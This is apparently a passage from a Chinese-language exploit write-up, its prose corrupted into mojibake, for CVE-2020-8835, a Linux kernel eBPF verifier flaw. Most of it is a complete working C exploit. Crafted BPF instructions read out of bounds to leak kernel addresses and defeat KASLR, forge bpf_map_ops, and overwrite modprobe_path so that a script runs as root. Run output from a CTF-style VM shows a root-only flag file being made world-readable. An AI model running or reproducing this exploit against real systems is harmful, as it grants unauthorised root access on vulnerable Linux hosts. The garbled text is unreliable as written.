å®Œæ•´exp å¦‚ä¸‹ï¼Œè¿™é‡Œéœ€è¦æœ‰ä¸¤ä¸ªå¤´æ–‡ä»¶ï¼Œ`bpf_insn.h` åœ¨`samples/bpf/bpf_insn.h` ä¸‹ï¼Œ ä¸»è¦æ˜¯ç”ŸæˆæŒ‡ä»¤çš„ä¸€äº›å®å®šä¹‰ã€‚

å› ä¸ºæˆ‘æœ¬æœºçš„ubuntu å†…æ ¸è¿˜ä¸æ”¯æŒ`BPF_JMP32` æ‰€ä»¥è¿˜éœ€è¦æ‹·è´ä¸€ä¸ª`bpf.h` ï¼Œå®ƒåœ¨`include/uapi/linux/bpf.h`

æ•´ç†ä¸€ä¸‹ `bpf_insns` éƒ½åšäº†ä»€ä¹ˆï¼Œ è¿™é‡Œæˆ‘åˆ›å»ºäº†ä¸¤ä¸ªmap( `ctrlmap` å’Œ `expmap`, æœ‰ç‚¹ä¹±â€¦)

ç¬¬ä¸€æ¬¡ `writemsg()` ï¼ˆ `ctrlmap[0] = 2; ctrlmap[1] = 0`ï¼‰
<li>
`r9 æŒ‡å‘ ctrlmap[0]` , load ä¹‹å `r6 ==2`
</li>
<li>ç„¶åå‰é¢æè¿°çš„æ¼æ´è§¦å‘è¿‡ç¨‹ï¼Œ æœ€å `BPF_ALU64_IMM(BPF_MUL,6,0x110)`, å¾—åˆ° `r6 == 0x100`
</li>
<li>
`r7 æŒ‡å‘ expmap[0]`, ç„¶å sub r6, è·å– `bpf_map_ops`å’Œ map çš„åœ°å€ï¼Œå†™å…¥åˆ° `ctrlmap[0][0x10]ctrlmap[0][0x18]` çš„ä½ç½®</li>
- exp ä¸­ `map_lookup_elem` è·å– æ³„éœ²çš„åœ°å€
ç¬¬äºŒæ¬¡ `writemsg()` ï¼ˆ `ctrlmap[0] = 2; ctrlmap[1] = 1`)
<li>æŠŠ `fake_map_ops` ä¿å­˜åˆ° `expmap[0]` ä¸Š, ä¿®æ”¹åŸæ¥çš„ `ops` æŒ‡å‘`fake_map_ops`
</li>
<li>æ”¹ `spin_lock_off`, `max_entries` ,`map_type`
</li>
<li>
`map_update_elem` æ”¹ `modprobe_path`
</li>
```
#define _GNU_SOURCE
#include &lt;stdio.h&gt;       
#include &lt;stdlib.h&gt;      
#include &lt;unistd.h&gt;      
#include &lt;fcntl.h&gt;       
#include &lt;stdint.h&gt;      
#include &lt;string.h&gt;      
#include &lt;sys/ioctl.h&gt;   
#include &lt;sys/syscall.h&gt; 
#include &lt;sys/socket.h&gt;  
#include &lt;errno.h&gt;       
#include "linux/bpf.h"   
#include "bpf_insn.h"    

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
#define LOG_BUF_SIZE 65535
char bpf_log_buf[LOG_BUF_SIZE];

void gen_fake_elf(){
    system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' &gt; /tmp/chmod"); 
    system("chmod +x /tmp/chmod");
    system("echo -ne '\xff\xff\xff\xff' &gt; /tmp/fake");
    system("chmod +x /tmp/fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){         
    uint64_t *buf64 =  (uint64_t *)buf;       
    printf("[-x64dump-] start : n");         
    for(int i=0;i&lt;num;i++){                   
            if(i%2==0 &amp;&amp; i!=0){                   
                printf("n");                     
            }                                     
            printf("0x%016lx ",*(buf64+i));       
        }                                         
    printf("n[-x64dump-] end ... n");       
}                                             
void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lxn",num);              
}                                           

static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version);      
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);

struct bpf_insn insns[]={

    BPF_LD_MAP_FD(BPF_REG_1,3),

    BPF_ALU64_IMM(BPF_MOV,6,0),
    BPF_STX_MEM(BPF_DW,10,6,-8),
    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
            BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),
    // r9 = ctrlmap[0]
    BPF_MOV64_REG(9,0),
    //2
    BPF_LDX_MEM(BPF_DW,6,9,0),
    // offset


    /*// BPF_JGE çœ‹ tnum  umin 1*/
    BPF_ALU64_IMM(BPF_MOV,0,0),

    BPF_JMP_IMM(BPF_JGE,6,1,1),
    BPF_EXIT_INSN(),

    BPF_MOV64_IMM(8,0x1),
    BPF_ALU64_IMM(BPF_LSH,8,32),
    BPF_ALU64_IMM(BPF_ADD,8,1),
     /*BPF_JLE çœ‹ tnum  umax 0x100000001*/
    BPF_JMP_REG(BPF_JLE,6,8,1),
    BPF_EXIT_INSN(),


    /*//  JMP32  çœ‹ offset*/
    BPF_JMP32_IMM(BPF_JNE,6,5,1),
    BPF_EXIT_INSN(),

    BPF_ALU64_IMM(BPF_AND, 6, 2),
    BPF_ALU64_IMM(BPF_RSH, 6, 1),

    //r6 == offset
    //r9 = inmap
    /*BPF_ALU64_REG(BPF_MUL, 6, 7),*/

    BPF_ALU64_IMM(BPF_MUL,6,0x110),

    // outmap
    BPF_LD_MAP_FD(BPF_REG_1,4),

    BPF_ALU64_IMM(BPF_MOV,8,0),
    BPF_STX_MEM(BPF_DW,10,8,-8),

    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
            BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),

    BPF_MOV64_REG(7,0),

    BPF_ALU64_REG(BPF_SUB,7,6),

    BPF_LDX_MEM(BPF_DW,8,7,0),
    /*// inmap[2] == map_addr*/
    BPF_STX_MEM(BPF_DW,9,8,0x10),
    BPF_MOV64_REG(2,8),

    BPF_LDX_MEM(BPF_DW,8,7,0xc0),
    BPF_STX_MEM(BPF_DW,9,8,0x18),

    BPF_STX_MEM(BPF_DW,7,8,0x40),
    BPF_ALU64_IMM(BPF_ADD,8,0x50),



    BPF_LDX_MEM(BPF_DW,2,9,0x8),
    BPF_JMP_IMM(BPF_JNE,2,1,4),
    BPF_STX_MEM(BPF_DW,7,8,0), //ops
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),//map type
    BPF_ST_MEM(BPF_W,7,0x24,-1),// max_entries
    BPF_ST_MEM(BPF_W,7,0x2c,0x0), //lock_off




    BPF_ALU64_IMM(BPF_MOV,0,0),
    BPF_EXIT_INSN(),
};

void  prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    if(ctrlmapfd&lt;0){ __exit(strerror(errno));}
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    if(expmapfd&lt;0){ __exit(strerror(errno));}
    printf("ctrlmapfd: %d,  expmapfd: %d n",ctrlmapfd,expmapfd);


    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            insns, sizeof(insns), "GPL", 0);  
    if(progfd &lt; 0){ __exit(strerror(errno));}

    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0){ 
        __exit(strerror(errno));
    }
}

void pwn(){
    printf("pwning...n");
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(0x100);
    char *expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i&lt;0x2000/8;i++){
        expbuf64[i] = i+1;
    }

    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x0;
    bpf_update_elem(ctrlmapfd,&amp;key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&amp;key,expbuf,0);
    writemsg();
    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&amp;key,ctrlbuf);
    x64dump(ctrlbuf,8);
    bpf_lookup_elem(expmapfd,&amp;key,expbuf);
    x64dump(expbuf,8);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    uint64_t kaslr = map_leak - 0xffffffff82016340;
    uint64_t modprobe_path = 0xffffffff82446d80 + kaslr;
    loglx("map_leak",map_leak);
    loglx("elem_leak",elem_leak);
    loglx("kaslr",kaslr);
    loglx("modprobe",modprobe_path);

    uint64_t fake_map_ops[]={
        kaslr +0xffffffff8116ec70,
        kaslr +0xffffffff8116fa00,
        0x0,
        kaslr +0xffffffff8116f2d0,
        kaslr +0xffffffff8116ed50,//get net key 5
        0x0,
        0x0,
        kaslr +0xffffffff81159b30,
        0x0,
        kaslr +0xffffffff81159930,
        0x0,
        kaslr +0xffffffff8116edd0,
        kaslr +0xffffffff8116f1c0,
        kaslr +0xffffffff8116ed80,
        kaslr +0xffffffff8116ed50,//map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116f050,
        0x0,
        kaslr +0xffffffff8116ee80,
        kaslr +0xffffffff8116f870,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116ece0,
        kaslr +0xffffffff8116ed10,
        kaslr +0xffffffff8116ee50,
    };

    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&amp;key,expbuf,0);


    //overwrite modeprobe path
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x1;
    bpf_update_elem(ctrlmapfd,&amp;key,ctrlbuf,0);
    writemsg();

    expbuf64[0] = 0x706d742f -1;
    bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path);
    expbuf64[0] = 0x6d68632f -1;
    bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path+4);
    expbuf64[0] = 0x646f -1;
    bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path+8);
}





int main(int argc,char **argv){
    init();
    prep();
    pwn();
    return 0;
}


static void __exit(char *err) {              
    fprintf(stderr, "error: %sn", err); 
    exit(-1);                            
}                                            
static void writemsg(void) {                                     
    char buffer[64];                                         
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));   
}                                                                


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));  
}
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C"></a>è¿è¡Œæ•ˆæœ

è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼Œå› ä¸ºæˆ‘ç”¨çš„æ˜¯ æ”¹`modprobe_path` çš„æ–¹å¼ï¼Œå¯ä»¥åƒ`/tmp/chmod` å†™å…¥ä»»æ„å‘½ä»¤ï¼Œç„¶åè¿è¡Œ`/tmp/fake` ï¼Œå°±å¯ä»¥rootæƒé™è¿è¡Œ`/tmp/chmod`

```
/home/pwn # ~ $ ls
~ $ cd /
/ $ ls -al flag
-rw-------    1 root     0               11 Apr 26  2019 flag
/ $ cat flag
cat: can't open 'flag': Permission denied
/ $ /exp
ctrlmapfd: 3,  expmapfd: 4
pwning...
[-x64dump-] start :
0x0000000000000002 0x0000000000000000
0xffffffff82016340 0xffff88800d8740c0
0x4141414141414141 0x4141414141414141
0x4141414141414141 0x4141414141414141
[-x64dump-] end ...
[-x64dump-] start :
0x0000000000000001 0x0000000000000002
0x0000000000000003 0x0000000000000004
0x0000000000000005 0x0000000000000006
0x0000000000000007 0x0000000000000008
[-x64dump-] end ...
[lx]  map_leak             : 0xffffffff82016340
[lx]  elem_leak            : 0xffff88800d874110
[lx]  kaslr                : 0
[lx]  modprobe             : 0xffffffff82446d80
/ $ ls /tmp
chmod  fake
/ $ cat /tmp/chmod
#!/bin/sh
/bin/chmod 777 /flag
/ $ /tmp/fake 
/tmp/fake: line 1: : not found
/ $ ls -al flag
-rwxrwxrwx    1 root     0               11 Apr 26  2019 flag
/ $ cat flag
*CTF{test}
```



## å°ç»“

æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªæ´å°±æ˜¯ä»£ç å†™é”™äº†:D , æœ¬æ¥æ˜¯æƒ³ç€æ—¢ç„¶æœ‰ `jmp32` çœ‹èƒ½ä¸èƒ½ä¼˜åŒ–ä¸€ä¸‹ä»€ä¹ˆçš„ï¼Œç„¶åå†™äº†ä¸ª bug. è¿™ä¸ªæ´ä¹Ÿæ²¡æœ‰å¯¹åº”çš„è¡¥ä¸ï¼Œlinuxåšäº†ç‰ˆæœ¬å›é€€ç›´æ¥åˆ é™¤äº†è¿™ä¸ªcommitä¸Šæ–°æ·»åŠ çš„ä»£ç ã€‚



## reference

[https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification](https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification)
